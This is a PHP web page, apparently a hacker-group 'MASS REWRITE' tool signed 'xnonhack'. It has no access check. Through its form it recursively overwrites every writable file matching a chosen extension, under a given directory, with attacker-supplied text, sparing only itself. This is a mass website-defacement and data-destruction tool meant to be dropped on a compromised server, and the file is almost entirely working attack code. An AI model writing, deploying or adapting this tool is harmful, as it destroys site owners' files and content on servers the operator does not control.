<style type="text/css">
@import url('https://fonts.googleapis.com/css?family=Ubuntu+Mono&display=swap');
body {
  font-family: 'Ubuntu Mono', monospace;
  color: #8a8a8a;
  background:rgba(222,222,222,0.73);
}

table {
  background:#fff;
  line-height: 40px;
  border-collapse: separate;
  border-spacing: 0;
  border: 25px solid #fff;
  width: 50%;
  margin: 50px auto;
  border-radius: 20px;
  box-shadow: 0px 0px 0px 6px rgba(222,222,222,0.73);
}

thead tr:first-child {
  background: #fff;
  color: #8a8a8a;
  border: none;
}

th:first-child,
td:first-child {
  padding: 0 15px 0 20px;
}

th {
  font-weight: 500;
}

thead tr:last-child th {
  border-bottom: none;
}

tr.hover:hover {
  background-color: #dedede;
  cursor: default;
}
tbody tr:last-child td {
  border: none;
}


tbody td {
  border-bottom:none;
}

td:last-child {
  padding-right: 10px;
}
textarea {
  font-family: 'Ubuntu Mono', monospace;
  background:rgba(222,222,222,0.73);
  border:1px solid rgba(222,222,222,0.73);
  margin-left:-8px;
  margin-right:10px;
  margin-top:10px;
  margin-bottom:-2px;
  width:100%;
  resize:none;
  border-radius: 8px;
  height:400px;
  color:#8a8a8a;
  padding: 12px 20px;
  -moz-border-bottom-colors: none;
  -moz-border-left-colors: none;
  -moz-border-right-colors: none;
  -moz-border-top-colors: none;
  outline:none;
}
  ::-webkit-scrollbar {
  width: 0px;
  height: 0px;
}
  ::-webkit-scrollbar-button:start:decrement,
  ::-webkit-scrollbar-button:end:increment  {
  height: 0px;
  background-color: transparent;
}
  ::-webkit-scrollbar-track-piece  {
  background-color: #eeeeee;
}
  ::-webkit-scrollbar-thumb:vertical {
  height: 0px;
  background-color: #666;
  border: 0px solid #eee;
  -webkit-border-radius: 16px;
}

input[type=submit] {
  font-family: 'Ubuntu Mono', monospace;
  padding:13px;
  outline:none;
  margin-left:-8px;
  margin-right:10px;
  margin-top:10px;
  margin-bottom:10px;
  color:#8a8a8a;
  font-weight: bold;
  border-radius: 8px;
  border:1px solid rgba(222,222,222,0.73);
  background:rgba(222,222,222,0.73);
}
input[type=text] {
  font-family: 'Ubuntu Mono', monospace;
  padding:7px 5px;
  outline:none;
  margin-left:-8px;
  margin-right:10px;
  margin-top:10px;
  margin-bottom:10px;
  color:#8a8a8a;
  border-bottom:3px solid rgba(222,222,222,0.73);
  border-top:none;
  border-left:none;
  border-right:none;
}
select {
  font-family: 'Ubuntu Mono', monospace;
  padding:7px 5px;
  outline:none;
  margin-left:-8px;
  margin-right:10px;
  margin-top:10px;
  margin-bottom:10px;
  color:#8a8a8a;
  border-bottom:3px solid rgba(222,222,222,0.73);
  border-top:none;
  border-left:none;
  border-right:none;
}
.alert {
  text-align: center;
  width: 100%;
  margin-top:10px;
  margin-left:-10px;
  margin-bottom:10px;
  border: 1px solid transparent;
  border-radius: 8px;
}
.alert-success {
  background-color: #91cf91;
  border-color: #80c780;
  color: #3d8b3d;
}
.alert-danger {
  background-color: #e27c79;
  border-color: #dd6864;
  color: #9f2723;
}
textarea:focus,
th.line {
  border:1px solid #dedede;
}
.icon {
  width:25px;
  height:25px;
  margin-bottom:-6px;
  margin-left:-8px;
}
textarea:hover,  
a.tools:hover, 
a.back:hover,
select:hover, 
input[type=submit]:hover {
    cursor:pointer;
    border:1px solid red;
    text-decoration:none;
}
select:focus,
input:focus {
  background:rgba(222,222,222,0.73);
  border-left:none;
  border-right:none;
  border-top:none;
  border-bottom: 3px solid red;
}
select:hover, 
input[type=text]:hover {
  border-left:none;
  border-right:none;
  border-top:none;
  border-bottom:3px solid red;
}
input {
    width:100%;
}
</style>
<table>
    <thead>
        <tr>
            <th>
                <h2>MASS REWRITE</h2>
            </th>
        </tr>
    </thead>
    <form method="post">
        <tr>
            <td>
                <input type="text" name="dir" value="<?= getcwd() ?>">
            </td>
        </tr>
        <tr>
            <td>
                <input type="text" name="type" placeholder="type">
            </td>
        </tr>
        <tr>
            <td>
                <textarea name="text"></textarea>
            </td>
        </tr>
        <tr>
            <td>
                <input type="submit" name="submit">
            </td>
        </tr>
    </form>
<?php
if (isset($_POST['submit'])) {
    mass($_POST['dir'], $_POST['type'], $_POST['text']);
}
function mass($dir, $type, $text) {
    if(is_writable($dir)) {
        $getfile = scandir($dir);
        foreach($getfile as $file) {
            $path = $dir.DIRECTORY_SEPARATOR.$file;
            if($file === '.' || filetype($path) == 'file') {
                if ((@preg_match("/".$type."$"."/", $file, $matches) != 0) && (@preg_match("/".$file."$/", $_SERVER['PHP_SELF'], $matches) != 1)):
                    ?>
                    <tr>
                        <td>
                            <div class="alert alert-success">
                                <?= $dir.DIRECTORY_SEPARATOR ?><b><?=$file ?> Successfully !</b>
                            </div>
                        </td>
                    </tr>
                    <?php
                file_put_contents($path, $text);
                endif;
            } elseif($file === '..' || filetype($path) == 'file') {
                if ((@preg_match("/".$type."$"."/", $file, $matches) != 0) && (@preg_match("/".$file."$/", $_SERVER['PHP_SELF'], $matches) != 1)):
                    ?>
                    <tr>
                        <td>
                            <div class="alert alert-success">
                                <?= $dir.DIRECTORY_SEPARATOR ?><b><?=$file ?> Successfully !</b>
                            </div>
                        </td>
                    </tr>
                    <?php
                file_put_contents($path, $text);
                endif;
            } else {
                if(is_dir($path)) {
                    if(is_writable($path)) {
                        @file_put_contents($path, $text);
                        mass($path,$type,$text);
                    }
                }
            }
        }
    }
}
?>
</table>
<center>
    &copy; copyright 2020 by xnonhack
</center>
